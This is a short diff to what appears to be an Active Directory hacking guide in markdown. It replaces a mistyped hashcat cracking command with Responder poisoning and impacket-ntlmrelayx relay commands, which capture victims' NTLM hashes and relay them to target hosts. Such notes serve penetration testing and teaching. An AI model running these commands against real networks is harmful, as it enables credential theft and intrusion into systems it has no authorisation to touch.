@@ -94,7 +94,11 @@ The hash of the victim is them capture on responder
 <img width="696" height="197" alt="image" src="https://github.com/user-attachments/assets/9d0d67af-20d0-4068-b26c-d3cc71c62a3b" />
 
 We can then crack the Hash using hashcat
-```hashcash -m 5600 hashes.txt /path/to/wordlist/
+# listen with responder
+sudo responder -I eth0 -ldwPv
+
+# relay to targets listed in target.txt, enable SMB2 support
+impacket-ntlmrelayx -tf target.txt -smb2support
 
 
 # Windows-Active-Directory-Hacking
